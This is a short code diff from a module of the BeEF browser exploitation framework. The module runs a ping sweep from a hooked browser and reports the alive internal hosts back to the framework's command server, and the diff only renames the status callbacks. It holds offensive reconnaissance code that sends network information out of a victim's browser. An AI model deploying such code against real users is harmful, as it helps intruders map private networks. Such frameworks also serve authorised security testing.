@@ -28,11 +28,11 @@ beef.execute(function() {
                     output = document.pingSweep.getAliveHosts();
                     clearTimeout(int_timeout);
                     clearTimeout(ext_timeout);
-				    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'ps=Alive hosts:<br>'+output.replace(/\n/g,"<br>"), beef.are.status_success());
+				    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'ps=Alive hosts:<br>'+output.replace(/\n/g,"<br>"), beef.status.success());
 				    beef.dom.detachApplet('pingSweep');
 				    return;
                 }else{
-                     beef.net.send('<%= @command_url %>', <%= @command_id %>, 'ps=No hosts to check', beef.are.status_error());
+                     beef.net.send('<%= @command_url %>', <%= @command_id %>, 'ps=No hosts to check', beef.status.error());
                      return;
                 }
 			} catch (e) {
